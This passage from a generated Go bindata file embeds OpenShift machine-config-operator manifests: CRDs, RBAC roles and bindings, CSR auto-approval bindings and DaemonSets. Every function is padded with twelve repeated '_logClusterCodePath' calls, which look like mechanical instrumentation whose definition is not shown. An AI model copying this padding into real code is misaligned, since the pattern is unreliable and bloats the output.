	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigdaemonEventsRolebindingTargetYaml, nil
}
func manifestsMachineconfigdaemonEventsRolebindingTargetYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigdaemonEventsRolebindingTargetYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigdaemon/events-rolebinding-target.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigdaemonSaYaml = []byte(`apiVersion: v1
kind: ServiceAccount
metadata:
  namespace: {{.TargetNamespace}}
  name: machine-config-daemon
`)

func manifestsMachineconfigdaemonSaYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigdaemonSaYaml, nil
}
func manifestsMachineconfigdaemonSaYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigdaemonSaYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigdaemon/sa.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigpoolCrdYaml = []byte(`apiVersion: apiextensions.k8s.io/v1beta1
kind: CustomResourceDefinition
metadata:
  # name must match the spec fields below, and be in the form: <plural>.<group>
  name: machineconfigpools.machineconfiguration.openshift.io
spec:
  additionalPrinterColumns:
  - JSONPath: .status.configuration.name
    name: Config
    type: string
  - JSONPath: .status.conditions[?(@.type=="Updated")].status
    description: When all the machines in the pool are updated to the correct machine config.
    name: Updated
    type: string
  - JSONPath: .status.conditions[?(@.type=="Updating")].status
    description: When at least one of machine is not either not updated or is in the process of updating to the desired machine config.
    name: Updating
    type: string
  - JSONPath: .status.conditions[?(@.type=="Degraded")].status
    description: When progress is blocked on updating one or more nodes, or the pool configuration is failing.
    name: Degraded
    type: string
  # group name to use for REST API: /apis/<group>/<version>
  group: machineconfiguration.openshift.io
  # list of versions supported by this CustomResourceDefinition
  versions:
    - name: v1
      # Each version can be enabled/disabled by Served flag.
      served: true
      # One and only one version must be marked as the storage version.
      storage: true
  # either Namespaced or Cluster
  scope: Cluster
  subresources:
    status: {}
  names:
    # plural name to be used in the URL: /apis/<group>/<version>/<plural>
    plural: machineconfigpools
    # singular name to be used as an alias on the CLI and for display
    singular: machineconfigpool
    # kind is normally the CamelCased singular type. Your resource manifests use this.
    kind: MachineConfigPool
`)

func manifestsMachineconfigpoolCrdYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigpoolCrdYaml, nil
}
func manifestsMachineconfigpoolCrdYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigpoolCrdYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigpool.crd.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverClusterroleYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: machine-config-server
  namespace: {{.TargetNamespace}}
rules:
- apiGroups: ["machineconfiguration.openshift.io"]
  resources: ["machineconfigs", "machineconfigpools"]
  verbs: ["*"]
`)

func manifestsMachineconfigserverClusterroleYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverClusterroleYaml, nil
}
func manifestsMachineconfigserverClusterroleYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverClusterroleYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/clusterrole.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverClusterrolebindingYaml = []byte(`apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: machine-config-server
  namespace: {{.TargetNamespace}}
roleRef:
  kind: ClusterRole
  name: machine-config-server
subjects:
- kind: ServiceAccount
  namespace: {{.TargetNamespace}}
  name: machine-config-server
`)

func manifestsMachineconfigserverClusterrolebindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverClusterrolebindingYaml, nil
}
func manifestsMachineconfigserverClusterrolebindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverClusterrolebindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/clusterrolebinding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverCsrApproverRoleBindingYaml = []byte(`# CSRApproverRoleBindingTemplate instructs the csrapprover controller to
# automatically approve CSRs made by serviceaccount node-bootstrapper in openshift-machine-config-operator
# for client credentials.
#
# This binding should be removed to disable CSR auto-approval.
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system-bootstrap-approve-node-client-csr
subjects:
- kind: ServiceAccount
  name: node-bootstrapper
  namespace: openshift-machine-config-operator
roleRef:
  kind: ClusterRole
  name: system:certificates.k8s.io:certificatesigningrequests:nodeclient
  apiGroup: rbac.authorization.k8s.io`)

func manifestsMachineconfigserverCsrApproverRoleBindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverCsrApproverRoleBindingYaml, nil
}
func manifestsMachineconfigserverCsrApproverRoleBindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverCsrApproverRoleBindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/csr-approver-role-binding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverCsrBootstrapRoleBindingYaml = []byte(`# system-bootstrap-node-bootstrapper lets serviceaccount ` + "`" + `openshift-machine-config-operator/node-bootstrapper` + "`" + ` tokens and nodes request CSRs.
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system-bootstrap-node-bootstrapper
subjects:
- kind: ServiceAccount
  name: node-bootstrapper
  namespace: openshift-machine-config-operator
roleRef:
  kind: ClusterRole
  name: system:node-bootstrapper
  apiGroup: rbac.authorization.k8s.io`)

func manifestsMachineconfigserverCsrBootstrapRoleBindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverCsrBootstrapRoleBindingYaml, nil
}
func manifestsMachineconfigserverCsrBootstrapRoleBindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverCsrBootstrapRoleBindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/csr-bootstrap-role-binding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverCsrRenewalRoleBindingYaml = []byte(`# CSRRenewalRoleBindingTemplate instructs the csrapprover controller to
# automatically approve all CSRs made by nodes to renew their client
# certificates.
#
# This binding should be altered in the future to hold a list of node
# names instead of targeting ` + "`" + `system:nodes` + "`" + ` so we can revoke invidivual
# node's ability to renew its certs.
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: system-bootstrap-node-renewal
subjects:
- kind: Group
  name: system:nodes
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: ClusterRole
  name: system:certificates.k8s.io:certificatesigningrequests:selfnodeclient
  apiGroup: rbac.authorization.k8s.io`)

func manifestsMachineconfigserverCsrRenewalRoleBindingYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverCsrRenewalRoleBindingYaml, nil
}
func manifestsMachineconfigserverCsrRenewalRoleBindingYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverCsrRenewalRoleBindingYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/csr-renewal-role-binding.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverDaemonsetYaml = []byte(`apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: machine-config-server
  namespace: {{.TargetNamespace}}
spec:
  selector:
    matchLabels:
      k8s-app: machine-config-server
  template:
    metadata:
      name: machine-config-server
      labels:
        k8s-app: machine-config-server
    spec:
      containers:
      - name: machine-config-server
        image: {{.Images.MachineConfigServer}}
        args:
          - "start"
          - "--apiserver-url={{.APIServerURL}}"
        resources:
          requests:
            cpu: 20m
            memory: 50Mi
        volumeMounts:
        - name: certs
          mountPath: /etc/ssl/mcs
        - name: node-bootstrap-token
          mountPath: /etc/mcs/bootstrap-token
      hostNetwork: true
      nodeSelector:
        node-role.kubernetes.io/master: ""
      priorityClassName: "system-cluster-critical"
      serviceAccountName: machine-config-server
      tolerations:
        - key: node-role.kubernetes.io/master
          operator: Exists
          effect: NoSchedule
      volumes:
      - name: node-bootstrap-token
        secret:
          secretName: node-bootstrapper-token
      - name: certs
        secret:
          secretName: machine-config-server-tls
`)

func manifestsMachineconfigserverDaemonsetYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverDaemonsetYaml, nil
}
func manifestsMachineconfigserverDaemonsetYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverDaemonsetYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/daemonset.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverKubeApiserverServingCaConfigmapYaml = []byte(`apiVersion: v1
kind: ConfigMap
metadata:
  name: initial-kube-apiserver-server-ca
  namespace: openshift-config
data:
  ca-bundle.crt: |
{{.KubeAPIServerServingCA | indent 4}}
`)

func manifestsMachineconfigserverKubeApiserverServingCaConfigmapYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverKubeApiserverServingCaConfigmapYaml, nil
}
func manifestsMachineconfigserverKubeApiserverServingCaConfigmapYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverKubeApiserverServingCaConfigmapYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/kube-apiserver-serving-ca-configmap.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverNodeBootstrapperSaYaml = []byte(`apiVersion: v1
kind: ServiceAccount
metadata:
  namespace: {{.TargetNamespace}}
  name: node-bootstrapper
`)

func manifestsMachineconfigserverNodeBootstrapperSaYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverNodeBootstrapperSaYaml, nil
}
func manifestsMachineconfigserverNodeBootstrapperSaYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverNodeBootstrapperSaYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/node-bootstrapper-sa.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverNodeBootstrapperTokenYaml = []byte(`apiVersion: v1
kind: Secret
metadata:
  annotations:
    kubernetes.io/service-account.name: node-bootstrapper
  name: node-bootstrapper-token
  namespace: {{.TargetNamespace}}
type: kubernetes.io/service-account-token
`)

func manifestsMachineconfigserverNodeBootstrapperTokenYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverNodeBootstrapperTokenYaml, nil
}
func manifestsMachineconfigserverNodeBootstrapperTokenYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverNodeBootstrapperTokenYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/node-bootstrapper-token.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMachineconfigserverSaYaml = []byte(`apiVersion: v1
kind: ServiceAccount
metadata:
  namespace: {{.TargetNamespace}}
  name: machine-config-server
`)

func manifestsMachineconfigserverSaYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMachineconfigserverSaYaml, nil
}
func manifestsMachineconfigserverSaYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMachineconfigserverSaYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/machineconfigserver/sa.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsMasterMachineconfigpoolYaml = []byte(`apiVersion: machineconfiguration.openshift.io/v1
kind: MachineConfigPool
metadata:
  name: master
  labels:
    "operator.machineconfiguration.openshift.io/required-for-upgrade": ""
spec:
  machineConfigSelector:
    matchLabels:
      "machineconfiguration.openshift.io/role": "master"
  nodeSelector:
    matchLabels:
      node-role.kubernetes.io/master: ""`)

func manifestsMasterMachineconfigpoolYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsMasterMachineconfigpoolYaml, nil
}
func manifestsMasterMachineconfigpoolYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsMasterMachineconfigpoolYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/master.machineconfigpool.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}

var _manifestsWorkerMachineconfigpoolYaml = []byte(`apiVersion: machineconfiguration.openshift.io/v1
kind: MachineConfigPool
metadata:
  name: worker
spec:
  machineConfigSelector:
    matchLabels:
      "machineconfiguration.openshift.io/role": "worker"
  nodeSelector:
    matchLabels:
      node-role.kubernetes.io/worker: ""`)

func manifestsWorkerMachineconfigpoolYamlBytes() ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return _manifestsWorkerMachineconfigpoolYaml, nil
}
func manifestsWorkerMachineconfigpoolYaml() (*asset, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	bytes, err := manifestsWorkerMachineconfigpoolYamlBytes()
	if err != nil {
		return nil, err
	}
	info := bindataFileInfo{name: "manifests/worker.machineconfigpool.yaml", size: 0, mode: os.FileMode(0), modTime: time.Unix(0, 0)}
	a := &asset{bytes: bytes, info: info}
	return a, nil
}
func Asset(name string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("Asset %s can't read by error: %v", name, err)
		}
		return a.bytes, nil
	}
	return nil, fmt.Errorf("Asset %s not found", name)
}
func MustAsset(name string) []byte {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	a, err := Asset(name)
	if err != nil {
		panic("asset: Asset(" + name + "): " + err.Error())
	}
	return a
}
func AssetInfo(name string) (os.FileInfo, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cannonicalName := strings.Replace(name, "\\", "/", -1)
	if f, ok := _bindata[cannonicalName]; ok {
		a, err := f()
		if err != nil {
			return nil, fmt.Errorf("AssetInfo %s can't read by error: %v", name, err)
		}
		return a.info, nil
	}
	return nil, fmt.Errorf("AssetInfo %s not found", name)
}
func AssetNames() []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	names := make([]string, 0, len(_bindata))
	for name := range _bindata {
		names = append(names, name)
	}
	return names
}

var _bindata = map[string]func() (*asset, error){"manifests/bootstrap-pod-v2.yaml": manifestsBootstrapPodV2Yaml, "manifests/containerruntimeconfig.crd.yaml": manifestsContainerruntimeconfigCrdYaml, "manifests/controllerconfig.crd.yaml": manifestsControllerconfigCrdYaml, "manifests/kubeletconfig.crd.yaml": manifestsKubeletconfigCrdYaml, "manifests/machineconfig.crd.yaml": manifestsMachineconfigCrdYaml, "manifests/machineconfigcontroller/clusterrole.yaml": manifestsMachineconfigcontrollerClusterroleYaml, "manifests/machineconfigcontroller/clusterrolebinding.yaml": manifestsMachineconfigcontrollerClusterrolebindingYaml, "manifests/machineconfigcontroller/controllerconfig.yaml": manifestsMachineconfigcontrollerControllerconfigYaml, "manifests/machineconfigcontroller/deployment.yaml": manifestsMachineconfigcontrollerDeploymentYaml, "manifests/machineconfigcontroller/sa.yaml": manifestsMachineconfigcontrollerSaYaml, "manifests/machineconfigdaemon/clusterrole.yaml": manifestsMachineconfigdaemonClusterroleYaml, "manifests/machineconfigdaemon/clusterrolebinding.yaml": manifestsMachineconfigdaemonClusterrolebindingYaml, "manifests/machineconfigdaemon/daemonset.yaml": manifestsMachineconfigdaemonDaemonsetYaml, "manifests/machineconfigdaemon/events-clusterrole.yaml": manifestsMachineconfigdaemonEventsClusterroleYaml, "manifests/machineconfigdaemon/events-rolebinding-default.yaml": manifestsMachineconfigdaemonEventsRolebindingDefaultYaml, "manifests/machineconfigdaemon/events-rolebinding-target.yaml": manifestsMachineconfigdaemonEventsRolebindingTargetYaml, "manifests/machineconfigdaemon/sa.yaml": manifestsMachineconfigdaemonSaYaml, "manifests/machineconfigpool.crd.yaml": manifestsMachineconfigpoolCrdYaml, "manifests/machineconfigserver/clusterrole.yaml": manifestsMachineconfigserverClusterroleYaml, "manifests/machineconfigserver/clusterrolebinding.yaml": manifestsMachineconfigserverClusterrolebindingYaml, "manifests/machineconfigserver/csr-approver-role-binding.yaml": manifestsMachineconfigserverCsrApproverRoleBindingYaml, "manifests/machineconfigserver/csr-bootstrap-role-binding.yaml": manifestsMachineconfigserverCsrBootstrapRoleBindingYaml, "manifests/machineconfigserver/csr-renewal-role-binding.yaml": manifestsMachineconfigserverCsrRenewalRoleBindingYaml, "manifests/machineconfigserver/daemonset.yaml": manifestsMachineconfigserverDaemonsetYaml, "manifests/machineconfigserver/kube-apiserver-serving-ca-configmap.yaml": manifestsMachineconfigserverKubeApiserverServingCaConfigmapYaml, "manifests/machineconfigserver/node-bootstrapper-sa.yaml": manifestsMachineconfigserverNodeBootstrapperSaYaml, "manifests/machineconfigserver/node-bootstrapper-token.yaml": manifestsMachineconfigserverNodeBootstrapperTokenYaml, "manifests/machineconfigserver/sa.yaml": manifestsMachineconfigserverSaYaml, "manifests/master.machineconfigpool.yaml": manifestsMasterMachineconfigpoolYaml, "manifests/worker.machineconfigpool.yaml": manifestsWorkerMachineconfigpoolYaml}

func AssetDir(name string) ([]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	node := _bintree
	if len(name) != 0 {
		cannonicalName := strings.Replace(name, "\\", "/", -1)
		pathList := strings.Split(cannonicalName, "/")
		for _, p := range pathList {
			node = node.Children[p]
			if node == nil {
				return nil, fmt.Errorf("Asset %s not found", name)
			}
		}
	}
	if node.Func != nil {
		return nil, fmt.Errorf("Asset %s not found", name)
	}
	rv := make([]string, 0, len(node.Children))
	for childName := range node.Children {
		rv = append(rv, childName)
	}
	return rv, nil
}

type bintree struct {
	Func		func() (*asset, error)
	Children	map[string]*bintree
}

